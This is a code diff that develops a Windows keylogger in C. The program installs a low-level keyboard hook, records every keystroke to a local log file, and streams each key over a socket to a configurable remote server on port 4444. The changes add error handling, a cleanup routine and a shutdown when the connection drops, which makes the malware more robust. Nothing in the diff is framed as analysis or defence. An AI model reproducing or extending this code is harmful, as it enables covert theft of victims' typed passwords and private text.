@@ -4,16 +4,23 @@
 #include <ws2tcpip.h>
 #include <windows.h>
 
-// #pragma comment(lib, "ws2_32.lib")
-
 #define SERVER_IP "127.0.0.1" // Replace with your server IP
 #define SERVER_PORT 4444
 
+HHOOK hook;
+
 // Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
-void send_key(unsigned char key);
+int send_key(unsigned char key);
 FILE *logFile; // File pointer for logging
 SOCKET sock;   // Socket for sending data
+void cleanup() 
+{
+    UnhookWindowsHookEx(hook);
+    closesocket(sock);
+    WSACleanup();
+    fclose(logFile);
+}
 
 int main()
 {
@@ -71,6 +78,10 @@ int main()
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) 
     {
+        if (msg.message == WM_QUIT) 
+        {
+            break; // Exit the loop if quit message is received
+        }
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
@@ -80,14 +91,18 @@ int main()
     closesocket(sock); // Close the socket
     WSACleanup(); // Clean up Winsock
     fclose(logFile); // Close the log file
-
+    cleanup();
     return 0;
 }
 
 // Function to send the logged key to the remote server
-void send_key(unsigned char key) 
+int send_key(unsigned char key) 
 {
-    send(sock, (char*)&key, sizeof(key), 0); // Send the key pressed
+    if (send(sock, (char*)&key, sizeof(key), 0) == SOCKET_ERROR) {
+        // Connection lost or error occurred
+        return 0;
+    }
+    return 1; // Successfully sent
 }
 
 // Keyboard procedure to handle key events
@@ -100,7 +115,11 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
         {
             DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode; // Get virtual key code
             printf("%c", (char)vkCode);
-            send_key((char)vkCode);
+            if (!send_key((char)vkCode)) {
+                // Connection lost, post quit message
+                PostQuitMessage(0);
+                return 1; // Stop further processing
+            }
             fprintf(logFile, "%c ", (char)vkCode); // Log the key code
             fflush(logFile); // Flush the output buffer
         }
